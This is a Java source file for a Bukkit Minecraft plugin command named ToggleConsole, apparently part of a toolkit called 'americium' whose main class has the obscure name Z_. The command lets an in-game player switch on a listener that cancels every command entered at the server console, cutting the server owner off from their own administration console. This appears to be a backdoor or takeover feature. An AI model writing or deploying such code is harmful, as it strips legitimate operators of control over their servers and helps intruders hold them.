package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.server.ServerCommandEvent;

public class ToggleConsole implements Listener, Command {
    private Boolean toggled = false;

    @Override
    public String[] getCommands() {
        return new String[]{"toggleconsole", "tc"};
    }

    @Override
    public String getDescription() {
        return "Toggle console usage off/on.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String status = "off";

        this.toggled = !toggled;
        if (!this.toggled) {
            status = "on";
        }

        sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully toggled console " + status + "!");
    }

    @Override
    public void onEnable(Z_ z) {
        z.getServer().getPluginManager().registerEvents(this, z);
    }

    @EventHandler
    private void consoleCommand(ServerCommandEvent e) {
        if (toggled) {
            e.setCancelled(true);
        }
    }
}
